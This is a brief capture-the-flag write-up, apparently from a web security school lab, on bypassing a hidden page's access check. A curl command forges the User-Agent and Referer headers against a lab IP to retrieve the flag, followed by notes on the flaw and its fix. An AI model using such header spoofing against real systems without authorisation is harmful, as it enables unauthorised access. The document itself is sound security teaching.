# User-Agent and Referer Bypass

Inspecting the page source revealed a hidden route.

On that route, HTML comments indicated two requirements:

1. Referer must be `https://www.nsa.gov/`
2. User-Agent must be `ft_bornToSec`

We reproduced this with `curl`:

```bash
curl \
	-A "ft_bornToSec" \
	-e "https://www.nsa.gov/" \
	"http://10.11.200.193/index.php?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c"
```

The response contained the flag.

## Vulnerability
Access was based only on headers that anyone can fake.

## Mitigation
Use login-based checks on the server, not header values.